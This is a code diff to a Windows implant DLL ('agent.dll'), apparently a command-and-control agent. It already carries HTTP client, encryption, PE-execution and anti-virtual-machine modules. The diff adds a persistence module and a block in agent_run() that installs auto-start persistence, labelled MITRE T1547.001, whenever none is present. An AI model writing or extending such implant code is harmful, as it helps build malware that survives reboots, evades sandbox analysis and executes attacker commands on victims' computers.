@@ -1,4 +1,4 @@
-// Compile with: x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32
+// Compile with: x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp persistence.cpp -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32
 #include <windows.h>
 #include <iostream>
 #include <thread>
@@ -11,6 +11,7 @@
 #include "crypt.h"
 #include "http_client.h"
 #include "task.h"
+#include "persistence.h"
 #ifdef ANTI_VM_ENABLED
 extern "C" bool is_virtual_machine();
 #endif
@@ -252,6 +253,11 @@ extern "C" __declspec(dllexport) void agent_run() {
         return;
     }
     #endif
+
+    // ===== AUTO-PERSISTENCE (MITRE T1547.001) =====
+    if (!is_persistence_installed()) {
+        install_persistence();
+    }
 
     // Générer l'agent_id
     string agent_id = generate_agent_id();
